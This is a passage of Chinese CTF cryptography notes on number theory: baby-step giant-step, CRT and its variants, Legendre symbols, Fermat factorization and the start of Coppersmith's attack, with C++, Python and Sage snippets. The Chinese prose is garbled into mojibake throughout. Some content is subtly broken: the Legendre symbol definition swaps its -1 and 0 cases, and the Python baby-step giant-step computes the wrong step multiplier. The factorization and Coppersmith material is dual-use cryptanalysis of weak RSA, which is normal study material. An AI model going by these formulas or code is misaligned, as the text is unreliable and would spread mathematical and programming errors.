ç³»ç»Ÿå»ºç«‹åœ¨æ›´å¤§çš„ç¾¤ä¸Šã€‚ è¿™æ˜¯ä¸€ç§ç©ºé—´æ¢æ—¶é—´çš„ç®—æ³•ï¼Œå®è´¨ä¸Šæ˜¯æ±‚è§£ç¦»æ•£å¯¹æ•°çš„æœ´ç´ ç®—æ³•ï¼ˆæšä¸¾å¹¶è¯•ä¹˜ï¼‰çš„ä¸€ä¸ªç›¸å½“ç®€å•çš„æ”¹è¿›ã€‚ å¤§æ­¥å°æ­¥ç®—æ³•å¸¸ç”¨äºæ±‚è§£ç”¨äºè§£å†³è§£é«˜æ¬¡åŒä½™æ–¹ç¨‹çš„é—®é¢˜ï¼Œé—®é¢˜å½¢å¼å¦‚ï¼šæœ‰åŒä½™æ–¹ç¨‹ $a^x \\equiv b \\pmod p$ï¼Œ$p$ ä¸ºè´¨æ•°ï¼Œæ±‚æœ€å°éè´Ÿæ•´æ•°è§£ $x$ ä½¿å¾—åŸæ–¹ç¨‹æˆç«‹ã€‚è¿™ç±»é—®é¢˜ä¹Ÿç§°ä¸ºç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚è¯¥ç®—æ³•çš„å¤æ‚åº¦å¯ä»¥è¾¾åˆ° $O(\\sqrt{p}\\log{n})$ ç”šè‡³æ›´ä½ã€‚ åŸç† æ ¹æ®æ¬§æ‹‰å®šç†ï¼Œæˆ‘ä»¬çŸ¥é“æ¨¡çš„å‰©ä½™ç±»æœ‰äº§ç”Ÿå¾ªç¯çš„æƒ…å†µï¼Œå³ $a^0, a^1, \\ldots, a^{n-1}$ æ¨¡ $n$ï¼ˆè´¨æ•°ï¼‰æ„ä¹‰ä¸‹çš„å‰©ä½™ç±»ä¸ $a^n, a^{n+1}, \\ldots, a^{2n-1}$ çš„å‰©ä½™ç±»ç›¸åŒï¼Œå› æ­¤æˆ‘ä»¬è¦çš„ç­”æ¡ˆä¸€å®šåœ¨ $[0, n-1]$ å†…ã€‚æˆ‘ä»¬è€ƒè™‘å…ˆæ±‚å‡ºä¸€éƒ¨åˆ† $a$ çš„å¹‚æ¬¡æ¨¡ $p$ æ„ä¹‰ä¸‹çš„å€¼ï¼Œå°†å®ƒä»¬å­˜èµ·æ¥ï¼Œç„¶åä½¿å¾—å‰©ä¸‹æ²¡æœ‰æ±‚å€¼çš„éƒ¨åˆ†èƒ½å¤Ÿæƒ³ä¸ªåŠæ³•åˆ©ç”¨å·²æ±‚å€¼ç›´æ¥æŸ¥å‡ºæ¥ã€‚æˆ‘ä»¬æƒ³èµ·äº†æ ¹å·ï¼Œä¸å¦‚ç›´æ¥ä»¤æ±‚å€¼çš„é•¿åº¦ä¸º $m=\\lceil \\sqrt{p} \\rceil$ã€‚ä¸‹é¢è¦è€ƒè™‘çš„æ˜¯æ²¡æœ‰æ±‚å€¼éƒ¨åˆ†æ€ä¹ˆæ¥æ±‚ï¼Œæ¯”å¦‚ $a^m, \\ldots, a^{2m-1}$ è¿™ä¸€æ®µï¼Œå¦‚æœæœ‰è§£ï¼Œä¸€å®šæ˜¯ $a^i \\cdot a^m \\equiv b \\pmod{p}$ çš„æƒ…å†µï¼Œæˆ‘ä»¬æŠŠé‚£ä¸ª $a^m$ ç§»åˆ°å³è¾¹æ¥ï¼Œå°±å˜æˆäº† $a^i \\equiv bâ€™ \\pmod{p}$ ä¸” $bâ€™ = ba^{-m}$ã€‚æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸è€ƒè™‘ç›´æ¥æŸ¥è¿™ä¸ª $bâ€™$ æœ‰æ²¡æœ‰å¯¹åº”çš„içš„ç­”æ¡ˆã€‚è¿™æ ·ï¼Œæ²¡æœ‰æ±‚å€¼çš„éƒ¨åˆ†çš„æ¯ä¸€æ®µå°±å¯ä»¥åªè¿›è¡Œä¸€æ¬¡æŸ¥è¯¢æ¥åˆ¤æ–­è¯¥æ®µå†…æ˜¯å¦æœ‰è§£ã€‚è¿™ä¸ªä¿å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªmap&lt;int,int&gt;æ¥å­˜ï¼Œ$x[i]$ ä¸ºä½™æ•°ä¸º $i$ çš„ $a^x$ ä¸­æœ€å°çš„ $x$ å€¼ï¼Œåˆ™æ’å…¥æŸ¥è¯¢éƒ½ä¸º $O(\\log n)$ï¼Œæ€»å¤æ‚åº¦è¾¾åˆ° $O(\\sqrt{n} \\log n)$ã€‚å½“ç„¶è¿˜å¯ä»¥ç”¨HashMapå­˜ï¼Œå¤æ‚åº¦ä¼šæ›´ä¼˜ä¸€äº›ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839//C++#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;map&gt; using namespace std;typedef long long LL; LL quick_mod(LL a, LL b, LL c)//è´¹é©¬å°å®šç†+å¿«é€Ÿå¹‚æ±‚é€†å…ƒ &#123; LL ans = 1; while (b) &#123; if (b % 2 == 1) ans = (ans*a) % c; b /= 2; a = (a*a) % c; &#125; return ans;&#125; int log_mod(int a, int b, int n) &#123; int m, v, e = 1, i; m = (int)sqrt(n + 0.5); v = quick_mod(quick_mod(a, m, n),n-2, n); map&lt;int, int&gt; x; x[1] = 0; for (int i = 1; i &lt; m; i++) &#123; e = e*a%n; if (!x.count(e)) x[e] = i; &#125; for (i = 0; i &lt; m; i++) &#123; if (x.count(b)) return i*m + x[b]; b = b*v%n; &#125; return -1;&#125; 123456789101112#pythondef BSGS(g, y, p): m = int(sqrt(p)) if not is_square(p): m += 1 S = &#123;pow(g, j, p): j for j in range(m)&#125; gs = pow(g, inverse(m, p), p) for i in range(m): if y in S: return i * m + S[y] y = y * gs % p return None â€‹ æ‰©å±•å¤§æ­¥å°æ­¥ç®—æ³•ï¼ˆæ‰©å±•BSGSç®—æ³•ï¼‰åŸç† $p$ éè´¨æ•°æ€ä¹ˆåŠå‘¢ï¼Ÿå¹¶ä¸æ˜¯è¯´ $p-1$ ä»¥å†…æ²¡æœ‰ç­”æ¡ˆï¼Œè€Œæ˜¯ $p$ å¯èƒ½ä¼šå¾ˆå¤§ã€‚æƒ³ä¸ªåŠæ³•æ¥ç¼©å° $p$ çš„èŒƒå›´ã€‚æˆ‘ä»¬æƒ³èµ·äº†ä¸€äº›åŒä½™æ€§è´¨ï¼Œæ¯”å¦‚ $a \\equiv b \\pmod{m} \\Leftrightarrow \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{m}{d}}$ï¼Œå…¶ä¸­ $d$ ä¸º $a,b,m$ çš„æ­£å…¬å› æ•°ã€‚æˆ‘ä»¬æƒ³åŠæ³•å¦‚æ­¤æå…¬å› æ•°ã€‚ä»æ–¹ç¨‹å·¦è¾¹æ‹†ä¸€ä¸ª $a$ å‡ºæ¥ï¼Œæå…¬å› æ•°ï¼Œæå®Œå°±å˜æˆè¿™æ ·ä¸€ä¸ªå¼å­ $a^{x-1} \\cdot \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{p}{d}}$ã€‚ç›´åˆ°æŸä¸ªæ—¶å€™ $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) = 1$ã€‚å¦‚æœåœ¨æå…¬å› æ•°çš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ° $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) \\neq 1$ ä¸” $d$ ä¸èƒ½æ•´é™¤ $b$ çš„æƒ…å†µï¼Œè¯´æ˜å¼å­æ— è§£ã€‚ å› ä¸º $a^x, p$ ä¸­çš„ä¸€ä¸ªå…±åŒçš„å› æ•°$b$ä¸­æ²¡æœ‰ï¼Œæ˜¾ç„¶ä¸å­˜åœ¨è¿™æ ·çš„ $b$ã€‚ç»“æŸä»¥åï¼Œæˆ‘ä»¬å¾—åˆ°çš„ä¼šæ˜¯ä¸€ä¸ªè¿™æ ·çš„å¼å­$a^{x-k} \\cdot \\frac{a^k}{\\prod_i d_i} \\equiv \\frac{b}{\\prod_i d_i} \\pmod{\\frac{p}{\\prod_i d_i}}$æŠŠåˆ†æ¯ææ‰$a^x \\equiv b \\pmod{\\frac{p}{\\prod_i d_i}}$è¿™ä¸ªç›´æ¥æ‰”ç»™æ™®é€šBSGSåšå°±å¥½äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll; inline int gcd(int a,int b)&#123; if(!b) return a; else&#123; while(int i=a%b)&#123; a=b; b=i; &#125; return b; &#125;&#125; inline int qpow(ll a,int n,int m) &#123; //è¿™ä¸ªå¿«é€Ÿå¹‚ä¿è¯pä¸æ˜¯1ï¼Œå°‘æ¨¡ä¸€æ¬¡æ˜¯ä¸€æ¬¡ ll s=1; while(n) &#123; if(n&amp;1) s=s*a%m; a=a*a%m; n&gt;&gt;=1; &#125; return s;&#125; unordered_map&lt;int,int&gt; M;//è¦æ±‚a,näº’è´¨ a^x=b mod n .k,tæ˜¯ç•™ç»™exbsgsè°ƒç”¨çš„int bsgs(int a,int b,int n,int k=1,int t=0) &#123; if(b==1) return 0; M.clear(); int m=ceil(sqrt(n)); ll s=b;//BS for(int i=0; i&lt;m; i++,s=s*a%n) M[s]=i; s=k;//GS k=qpow(a,m,n); for(ll i=1; i&lt;=m; i++) &#123; s=s*k%n; if(M.count(s)) return i*m-M[s]+t; //è¿™æ ·å°±ä¿è¯æ‰¾åˆ°çš„æ˜¯æœ€å°è§£äº† &#125; return -1;&#125; //a^x=b mod nint exbsgs(int a,int b,int n) &#123; if(b==1) &#123; return 0; &#125; int d=gcd(a,n),k=1,t=0; while(d^1) &#123; if(b%d) &#123; return -1; &#125; ++t; b/=d; n/=d; k=(ll)k*(a/d)%n; if(b==k) &#123; return t; &#125; d=gcd(a,n); &#125; return bsgs(a,b,n,k,t);&#125; int main() &#123; int a,b,n; while(1) &#123; scanf(&quot;%d%d%d&quot;,&amp;a,&amp;n,&amp;b); if(!a&amp;&amp;!n&amp;&amp;!b) break; a%=n; b%=n; int ans=exbsgs(a,b,n); if(ans==-1) puts(&quot;No Solution&quot;); else printf(&quot;%d\\n&quot;,ans); &#125; return 0;&#125; â€‹ å¨å°”é€Šå®šç†åœ¨åˆç­‰æ•°è®ºä¸­ï¼Œå¨å°”é€Šå®šç†ç»™å‡ºäº†åˆ¤å®šä¸€ä¸ªè‡ªç„¶æ•°æ˜¯å¦ä¸ºè´¨æ•°çš„å……åˆ†å¿…è¦æ¡ä»¶ã€‚å³ï¼šå½“ä¸”ä»…å½“pä¸ºè´¨æ•°æ—¶ï¼š $ (p-1)! \\equiv -1 \\pmod p$ä½†æ˜¯ç”±äºé˜¶ä¹˜æ˜¯å‘ˆçˆ†ç‚¸å¢é•¿çš„ï¼Œå…¶ç»“è®ºå¯¹äºå®é™…æ“ä½œæ„ä¹‰ä¸å¤§ã€‚ æ¨è®º $ (p-2)! \\equiv 1\\pmod p$ â€‹ æ¬§æ‹‰å®šç†åœ¨æ•°è®ºä¸­ï¼Œæ¬§æ‹‰å®šç†ï¼ˆä¹Ÿç§°è´¹é©¬-æ¬§æ‹‰å®šç†æˆ–æ¬§æ‹‰$\\varphi$å‡½æ•°å®šç†ï¼‰æ˜¯ä¸€ä¸ªå…³äºåŒä½™çš„æ€§è´¨ã€‚æ¬§æ‹‰å®šç†è¡¨æ˜ï¼Œè‹¥ $n,a$ ä¸ºæ­£æ•´æ•°ï¼Œä¸” $n,a$ äº’ç´ ï¼ˆå³ $\\gcd(a,n)=1$ï¼‰ï¼Œåˆ™ $a^{\\varphi (n)}\\equiv 1{\\pmod n}$å³ $a^{\\varphi (n)}$ ä¸ $1$ åœ¨æ¨¡ $n$ ä¸‹åŒä½™ï¼›$\\varphi (n)$ ä¸ºæ¬§æ‹‰å‡½æ•°ã€‚æ¬§æ‹‰å®šç†å¾—åäºç‘å£«æ•°å­¦å®¶è±æ˜‚å“ˆå¾·Â·æ¬§æ‹‰ã€‚ æ¬§æ‹‰å®šç†å®é™…ä¸Šæ˜¯è´¹é©¬å°å®šç†çš„æ¨å¹¿ã€‚ â€‹ è´¹é©¬å°å®šç†è´¹é©¬å°å®šç†æ˜¯æ•°è®ºä¸­çš„ä¸€ä¸ªå®šç†ã€‚ å‡å¦‚ $a$ æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œ$p$ æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œé‚£ä¹ˆ $a^p-a$ æ˜¯ $p$ çš„å€æ•°ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºï¼š $a^p \\equiv a \\pmod p$å¦‚æœ $a$ ä¸æ˜¯ $p$ çš„å€æ•°ï¼Œè¿™ä¸ªå®šç†ä¹Ÿå¯ä»¥å†™æˆï¼š $a^{p-1} \\equiv 1 \\pmod p$è¿™ä¸ªä¹¦å†™æ–¹å¼æ›´åŠ å¸¸ç”¨ã€‚ â€‹ è´¹é©¬å•†åœ¨è´¹é©¬å°å®šç†ä¸­ï¼Œ$\\frac{a^{p-1}-1}{p}$ æ˜¾ç„¶æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚ è¿™ä¸ªæ•´æ•°è¢«ç§°ä½œ $p$ çš„ä»¥ $a$ ä¸ºåŸºçš„è´¹é©¬å•†(Fermat Quotient)ï¼Œè®°ä½œ $q_p(a)$ã€‚ æ€§è´¨ ï¼ˆå…¶ä¸­ $a,b$ å’Œ $p$ äº’ç´ ï¼‰ $q_p(ab) \\equiv q_p(a)+q_p(b) \\pmod p$ $q_p(a^r) \\equiv rq_p(a) \\pmod p$ $q_p(p \\mp 1) \\equiv \\pm 1 \\pmod p$ $q_p(p \\mp a) \\equiv q_p(a) \\pm \\frac{1}{a} \\pmod p$ $-2q_p(2) \\equiv -\\sum\\limits_{k = 1}^{p-1} \\frac{(-1)^{k-1}}{k} \\pmod p = 1+\\frac{1}{2}+\\cdots+\\frac{1}{\\frac{p-1}{2}} \\pmod p = \\sum\\limits_{k = 1}^{\\frac{p-1}{2}} \\frac{1}{k} \\pmod p$ â€‹ äºŒæ¬¡å‰©ä½™äºŒæ¬¡å‰©ä½™(Quadratic Residue)å¸¸è¢«ç§°ä¸ºæ¨¡æ„ä¹‰å¼€æ ¹ï¼Œæ˜¯æ±‚æ»¡è¶³ $x^2 \\equiv a \\pmod p$ çš„å€¼ã€‚ å¹¶ä¸æ˜¯å¯¹æ¯ä¸ª $a$ è€Œè¨€ä¸Šé¢çš„æ–¹ç¨‹éƒ½æœ‰è§£ã€‚å¦‚æœä¸Šé¢çš„æ–¹ç¨‹æœ‰éé›¶è§£ï¼Œæˆ‘ä»¬ç§° $a$ æ˜¯æ¨¡ $p$ çš„äºŒæ¬¡å‰©ä½™ã€‚å¦‚æœæ–¹ç¨‹æ— è§£ï¼Œåˆ™ç§° $a$ æ˜¯æ¨¡ $p$ çš„äºŒæ¬¡éå‰©ä½™ã€‚ æ¬§æ‹‰å‡†åˆ™ $\\left(\\cfrac ap\\right) \\equiv a^{\\frac {p-1}2} \\pmod p$ å‹’è®©å¾·ç¬¦å· (Legendre Symbol)$L(a,p)=\\left(\\frac ap\\right)=\\left\\{\\begin{array}{cl}1,&amp;\\mbox{è‹¥ }a\\mbox{ æ˜¯ } p \\mbox{ çš„äºŒæ¬¡å‰©ä½™}\\newline -1,&amp;\\mbox{è‹¥ }a \\bmod p = 0\\newline 0,&amp;\\mbox{è‹¥ }a\\mbox{ æ˜¯ } p \\mbox{ çš„äºŒæ¬¡éå‰©ä½™}\\end{array}\\right.$ æ€§è´¨ $\\left(\\cfrac ap\\right) = \\left(\\cfrac {a \\pm p}p\\right) = \\left(\\cfrac {a \\bmod p}p\\right)$ $\\left(\\cfrac {ab}p\\right) = \\left(\\cfrac ap\\right)\\left(\\cfrac bp\\right)$ $\\left(\\frac {-1}p\\right)=\\left\\{\\begin{array}{cl}1,&amp; p \\equiv 1 \\pmod 4 \\newline -1,&amp; p \\equiv 3 \\pmod 4 \\end{array}\\right.$ $\\left(\\frac 2p\\right)=\\left\\{\\begin{array}{cl}1,&amp; p \\equiv \\pm 1 \\pmod 8 \\newline -1,&amp; p \\equiv \\pm 3 \\pmod 8 \\end{array}\\right.$ $\\left(\\cfrac pq\\right)\\left(\\cfrac qp\\right) = (-1)^{\\frac{p-1}2{\\frac{q-1}2}}$ $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax+b}p\\right)=0,p\\nmid a$ $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax^2+bx+c}p\\right) = \\left\\{\\begin{array}{cl}-\\left(\\cfrac ap\\right),&amp; p \\nmid b^2-4ac \\newline (p-1)\\left(\\cfrac ap\\right),&amp; p \\mid b^2-4ac \\end{array}\\right.$ å‚è€ƒï¼šSome sums of Legendreâ€™s symbols é›…å¯æ¯”ç¬¦å· (Jacobi Symbol)$J(a,p) = \\left(\\cfrac an\\right)= \\prod\\limits_{i=1}^{m} \\left(\\cfrac a{p_i}\\right)^{t_i},n = \\prod\\limits_{i=1}^{m} p_i^{t_i}$ æ€§è´¨ $\\left(\\cfrac an\\right) = \\left(\\cfrac {a \\pm n}n\\right) = \\left(\\cfrac {a \\bmod n}n\\right)$ $\\left(\\cfrac {ab}n\\right) = \\left(\\cfrac an\\right)\\left(\\cfrac bn\\right)$ $\\left(\\cfrac {-1}n\\right)= (-1)^{\\frac{n-1}2}$ $\\left(\\cfrac 2n\\right)= (-1)^{\\frac{n^2-1}8}$ â€‹ ä¸­å›½å‰©ä½™å®šç†ï¼ˆå­™å­å®šç† / CRTï¼‰å®šä¹‰ ç”¨ç°ä»£æ•°å­¦çš„è¯­è¨€æ¥è¯´æ˜çš„è¯ï¼Œä¸­å›½å‰©ä½™å®šç†ç»™å‡ºäº†ä»¥ä¸‹çš„ä¸€å…ƒçº¿æ€§åŒä½™æ–¹ç¨‹ç»„ï¼š $(S):\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ æœ‰è§£çš„åˆ¤å®šæ¡ä»¶ï¼Œå¹¶ç”¨æ„é€ æ³•ç»™å‡ºäº†åœ¨æœ‰è§£æƒ…å†µä¸‹è§£çš„å…·ä½“å½¢å¼ã€‚ è¯´æ˜ å‡è®¾æ•´æ•° $m_1,m_2,â€¦,m_n$ å…¶ä¸­ä»»ä¸¤æ•°äº’è´¨ï¼Œåˆ™å¯¹ä»»æ„çš„æ•´æ•°ï¼š$a_1,a_2,â€¦,a_n$ï¼Œæ–¹ç¨‹ç»„ $(S)$ æœ‰è§£ï¼Œå¹¶ä¸”é€šè§£å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼æ„é€ å¾—åˆ°ï¼š è®¾ $M=m_1Ã—m_2Ã—\\dotsÃ—m_n=\\prod\\limits_{i=1}^{n} m_i$ æ˜¯æ•´æ•° $m_1,m_2,â€¦,m_n$ çš„ä¹˜ç§¯ï¼Œå¹¶è®¾ $M_i=\\cfrac{M}{m_i},\\forall i \\in \\{1,2,â€¦,n\\}$ï¼Œå³ $M_i$ æ˜¯é™¤äº† $m_i$ ä»¥ä¸ºçš„ $n-1$ ä¸ªæ•´æ•°çš„ä¹˜ç§¯ã€‚ è®¾ $t_i=M_i^{-1}$ ä¸º $M_i$ æ¨¡ $m_i$ çš„æ•°è®ºå€’æ•°ï¼š$t_iM_i \\equiv 1 \\pmod {m_i},\\forall i \\in \\{1,2,â€¦,n\\}$ã€‚ æ–¹ç¨‹ç»„ $(S)$ çš„é€šè§£å½¢å¼ä¸ºï¼š $x=a_1t_1M_1+a_2t_2M_2+\\dots+a_nt_nM_n+kM=kM+\\sum\\limits_{i=1}^{n}a_it_iM_i,\\quad k\\in \\mathbb{Z}$ åœ¨æ¨¡ $M$ çš„æ„ä¹‰ä¸‹ï¼Œæ–¹ç¨‹ç»„ $(S)$ åªæœ‰ä¸€ä¸ªè§£ï¼š$x=\\sum\\limits_{i=1}^{n}a_it_iM_i$ã€‚ æ¨¡ä¸ä¸¤ä¸¤äº’è´¨çš„åŒä½™å¼ç»„å¯åŒ–ä¸ºæ¨¡ä¸¤ä¸¤äº’è´¨çš„åŒä½™å¼ç»„ï¼Œå†ç”¨å­™å­å®šç†ç›´æ¥æ±‚è§£ã€‚ 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 â€‹ æ‰©å±•ä¸­å›½å‰©ä½™å®šç†ï¼ˆæ‰©å±•CRT / ExCRTï¼‰ä¸­å›½å‰©ä½™å®šç†æ˜¯ç”¨æ¥è§£åŒä½™æ–¹ç¨‹ç»„çš„ï¼Œå®ƒè¦æ±‚ $m_1,m_2,â€¦,m_n$å…¶ä¸­ä¸¤ä¸¤äº’è´¨ã€‚ æ¨¡ä¸ä¸¤ä¸¤äº’è´¨çš„åŒä½™å¼ç»„å¯åŒ–ä¸ºæ¨¡ä¸¤ä¸¤äº’è´¨çš„åŒä½™å¼ç»„ï¼Œå†ç”¨ä¸­å›½å‰©ä½™å®šç†ç›´æ¥æ±‚è§£ã€‚ å½¢å¼ ç»™å®š $n$ ç»„éè´Ÿæ•´æ•° $m_i, a_i$ ï¼Œæ±‚è§£å…³äº $x$ çš„æ–¹ç¨‹ç»„çš„æœ€å°éè´Ÿæ•´æ•°è§£ã€‚ $\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ è§£æ³• æ‰©å±•ä¸­å›½å‰©ä½™å®šç†çš„æ–¹æ³•å’Œä¸­å›½å‰©ä½™å®šç†å…³ç³»ä¸å¤§ï¼Œæˆ‘ä»¬è´ªå¿ƒå¤„ç†å‰ $i-1$ é¡¹ï¼Œç„¶ååˆå¹¶å½“å‰æ–¹ç¨‹ã€‚ å°†æ¯ä¸ªæ–¹ç¨‹æ‹†æˆè‹¥å¹²ä¸ªæ–¹ç¨‹ $x=a_i \\pmod {p_{i,j}^{k_{i,j}}}$ï¼Œå…¶ä¸­ $m_i=\\prod p_{i,j}^{k_{i,j}}$ ä¸º$m_i$ çš„åˆ†è§£å¼ã€‚ å¯¹æ¯ä¸ªè´¨æ•° $p$ï¼Œåˆå¹¶å¯¹åº”çš„æ‰€æœ‰æ–¹ç¨‹ï¼Œä»è€Œè½¬åŒ–ä¸ºæ¨¡æ•°ä¸¤ä¸¤äº’è´¨çš„æƒ…å½¢ã€‚è‹¥åˆå¹¶è¿‡ç¨‹ä¸­å‡ºç°çŸ›ç›¾ï¼Œåˆ™åŸæ–¹ç¨‹ç»„æ— è§£ã€‚ 12345678910111213#äº’è´¨ä¸ä¸äº’è´¨ä¸¤ç§æƒ…å†µä¸‹éƒ½èƒ½å·¥ä½œè‰¯å¥½çš„ä¸­å›½å‰©ä½™å®šç†ï¼ˆè§£åŒä½™æ–¹ç¨‹ç»„ï¼‰def GCRT(mi, ai): # mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„ assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£ K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d return (cura % curm, curm) #(è§£,æœ€å°å…¬å€æ•°) å˜ç§1ï¼šNoisy CRT$L_i=\\frac{\\prod p_i}{p_i} \\cdot \\Big((\\frac{\\prod p_i}{p_i})^{-1} \\bmod p_i \\Big)$ $N \\equiv \\sum\\limits_{i=1}^{n}\\sum\\limits_{j=1}^{m} \\delta_{i,j}r_{i,j}L_i \\pmod {\\prod p_i}, \\delta = \\{0,1\\}$ æ„é€ æ ¼ï¼š $M =\\begin{bmatrix}P &amp; 0 &amp; \\cdots &amp; \\cdots &amp; 0 &amp; \\newliner_{1,1}L_1 &amp; B &amp; 0 &amp; \\cdots &amp; 0 &amp; \\newliner_{1,2}L_1 &amp; 0 &amp; B &amp; \\ddots &amp; \\vdots &amp; \\newline\\vdots &amp; \\vdots &amp; \\ddots &amp; \\ddots &amp; 0 &amp; \\newliner_{n,m}L_n &amp; 0 &amp; \\cdots &amp; 0 &amp; B &amp; \\newline\\end{bmatrix}$ $B$ ä¸»è¦æ˜¯ä¸ºäº†ä¼˜åŒ–æ ¼ï¼Œåªéœ€éšæ„é€‰å–å’Œ $N$ çš„bitç›¸åŒçš„æ•° $2^k$ å³å¯ï¼Œç›®æ ‡å‘é‡ä¸º $(N,\\delta_{1,1}B,\\delta_{1,2}B,\\cdots,\\delta_{n,m}B)$ã€‚ å‚è€ƒï¼š Noisy Polynomial Interpolation and Noisy Chinese Remaindering DeadSec CTF 2023 - Loudç³»åˆ— Neepu CTF 2023 - Loud &amp; Loud2 â€‹ è´¹é©¬å› å¼åˆ†è§£å¼•ç†ï¼šå¦‚æœ $n$ æ˜¯ä¸€ä¸ªæ­£å¥‡æ•°,é‚£ä¹ˆ $n$ åˆ†è§£ä¸ºä¸¤ä¸ªæ­£æ•´æ•°çš„ç§¯å’Œè¡¨ç¤ºæˆä¸¤ä¸ªå¹³æ–¹æ•°æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚ å³ï¼š$n=ab=x^2-y^2=(x+y)(x-y)=\\left(\\cfrac{a+b}{2}\\right)^2-\\left(\\cfrac{a-b}{2}\\right)^2$ã€‚ å› ä¸º $n$ ä¸ºå¥‡æ•°ï¼Œ$a,b$ å¿…ä¹Ÿä¸ºå¥‡æ•°ï¼Œæ‰€ä»¥ $(a+b)$ å’Œ $(a-b)$ å¿…ä¸ºå¶æ•°ï¼Œæ•…èƒ½è¢« $2$ æ•´é™¤ã€‚ ç®—æ³• ä» $x=\\lceil\\sqrt{n}\\rceil+k,k \\in \\mathbb{Z}$ å¼€å§‹ï¼Œå½“ $(x^2-n)$ å¯è¢«å®Œå…¨å¼€æ–¹ï¼Œå³ $x^2-n=y^2$ æ—¶ï¼Œå³æ±‚å‡º $(x,y)$ã€‚ 12345678910111213import gmpy2from Crypto.Util.number import *def factor(n): a = gmpy2.iroot(n, 2)[0] while 1: B2 = pow(a, 2) - n if gmpy2.is_square(B2): b = gmpy2.iroot(B2, 2)[0] p = a + b q = a - b return p, q a += 1 1234567891011121314151617181920from gmpy2 import *def fermat_factorization(n): factor_list = [] get_context().precision = 2048 x = int(sqrt(n)) print(x) while True: x += 1 y2 = x ** 2 - n if is_square(y2): print(&#x27;x = &#x27;,x) y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break return factor_list â€‹ é«˜æ–¯æ•´æ•°é«˜æ–¯æ•´æ•° $\\mathbb{Z}[i]=\\{a+bi \\mid a,b \\in \\mathbb{Z}\\}$â€‹ã€‚ å¯¹äº $z=x^2+y^2=(x+yi)(x-yi)=(y+xi)(y-xi)$â€‹ï¼Œä¸”æ»¡è¶³ $z=(a_1+b_1i)^t(a_1-b_1i)^t \\cdots (a_k+b_ki)^t(a_k-b_ki)^t$ï¼Œå¯ç”¨äºåˆ†è§£ $z$ æ±‚å¾— $x,y$ã€‚ 1234z = GI = GaussianIntegers()GI(z).factor()#å› å­ç»„åˆ â€‹ CopperSmithæ”»å‡»ç®—æ³•æè¿°ï¼š å‡è®¾ $N$ æ˜¯ä¸€ä¸ªæœªçŸ¥å› å­ç»„æˆçš„æ•°ï¼Œä¸”å­˜åœ¨ä¸€ä¸ªå› å­ $b \\ge N^{\\beta},(0 \\lt \\beta \\le 1)$ï¼Œ$f(x)$ æ˜¯ä¸€ä¸ªä¸€å…ƒä¸€æ¬¡ $d$ é˜¶çš„å¤šé¡¹å¼ï¼Œä¸” $c \\ge 1$ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ $\\text{O}(cd^5\\log^9(N))$ çš„å¤æ‚åº¦å†…æ±‚è§£æ‰€æœ‰çš„ $x_0$ã€‚ $f(x_0) \\equiv 0 \\pmod b, x_0 \\le cN^{\\frac{\\beta^2}{d}}$ Coppersmithæ”»å‡»ä¸Don Coppersmithç´§å¯†ç›¸å…³ï¼Œä»–æå‡ºäº†ä¸€ç§é’ˆå¯¹äºæ¨¡å¤šé¡¹å¼ï¼ˆå•å˜é‡ï¼ŒäºŒå…ƒå˜é‡ï¼Œç”šè‡³å¤šå…ƒå˜é‡ï¼‰æ‰¾æ‰€æœ‰å°æ•´æ•°æ ¹çš„å¤šé¡¹å¼æ—¶é—´çš„æ–¹æ³•ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°åœ¨æ¨¡ $N$ æ„ä¹‰ä¸‹å¤šé¡¹å¼æ‰€æœ‰çš„æ ¹ï¼Œè¿™ä¸€é—®é¢˜è¢«è®¤ä¸ºæ˜¯å¤æ‚çš„ï¼Œå³æ»¡è¶³ä¸‹å¼çš„æ ¹ï¼š $F(x)=x^n+a_{n-1} x^{n-1}+ Â·Â·Â·+ a_1 x+a_0 \\equiv 0 \\pmod N$ Coppersmith method ä¸»è¦æ˜¯é€šè¿‡ Lenstraâ€“Lenstraâ€“LovÃ¡sz lattice basis reduction 